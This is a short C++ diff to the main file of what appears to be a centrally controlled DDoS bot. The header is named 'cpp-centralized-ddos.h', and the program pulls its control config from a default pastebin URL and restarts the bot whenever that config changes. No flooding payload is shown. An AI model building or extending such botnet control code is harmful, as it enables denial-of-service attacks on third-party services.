@@ -1,17 +1,12 @@
-#include <iostream>
-#include <vector>
-#include "Config.h"
-#include "Bot.h"
-#include "ProxyList.h"
-
-using namespace std;
-using namespace std::chrono;
+﻿#include "cpp-centralized-ddos.h"
 
 void onConfigChanged() {
 
     Bot::stop();
 
     if (Config::localConfig.is_started) {
+
+        this_thread::sleep_for(seconds(5));
         Bot::start();
     }
 }
@@ -22,7 +17,7 @@ int main() {
 
     string configUrl;
 
-    cout << "Enter config url or leave empty for default: " << endl;
+    cout << "Enter config [https://pastebin.com/raw/yHpxtU1U]: " << endl;
     getline(cin, configUrl);
 
     if (configUrl.empty()) {
@@ -32,10 +27,9 @@ int main() {
     Config::Subscribe(onConfigChanged);
     Config::Init(configUrl);
 
-    Logger::Log(Config::localConfig.toString());
+    Config::Start();
     Bot::start();
 
-    Config::RunUpdater();
-
+    cin.get();
     return 0;
 }
